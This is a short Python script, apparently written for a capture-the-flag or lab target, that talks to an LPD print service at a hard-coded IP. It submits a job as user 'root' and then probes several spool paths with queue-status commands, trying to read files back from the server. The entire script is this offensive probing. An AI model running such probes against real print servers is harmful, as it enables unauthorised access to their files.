#!/usr/bin/env python3
import socket
import time

TARGET = "94.237.49.23"
PORT = 37326

# Intentar crear un job que escriba y luego leer desde spool
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(10)
s.connect((TARGET, PORT))

# Receive job
s.sendall(b'\x02lp\n')
time.sleep(0.2)
print(f"ACK 1: {s.recv(1024).hex()}")

# Control file
control = b"Uroot\nHlocalhost\nJtest\nftest_data\n"
s.sendall(b'\x02' + str(len(control)).encode() + b' cf test_cf\n' + control + b'\x00')
time.sleep(0.2)
print(f"ACK 2: {s.recv(1024).hex()}")

# Data file con contenido
data = b"TEST DATA LINE\n"
s.sendall(b'\x03' + str(len(data)).encode() + b' test_data\n' + data + b'\x00')
time.sleep(0.2)
print(f"ACK 3: {s.recv(1024).hex()}")

s.close()

time.sleep(1)

# Ahora intentar leer ese archivo creado
print("\n=== Intentando leer archivo creado ===")
for path in [
    "test_data",
    "lp/test_data",
    "/var/spool/lpd/lp/test_data",
    "test_cf",
    "/var/spool/lpd/lp/test_cf",
]:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)
    s.connect((TARGET, PORT))
    
    s.sendall(b'\x04' + path.encode() + b'\n')
    time.sleep(0.3)
    
    resp = s.recv(4096)
    s.close()
    
    print(f"Path '{path}': {len(resp)} bytes")
    if len(resp) > 1:
        print(f"  Data: {resp}")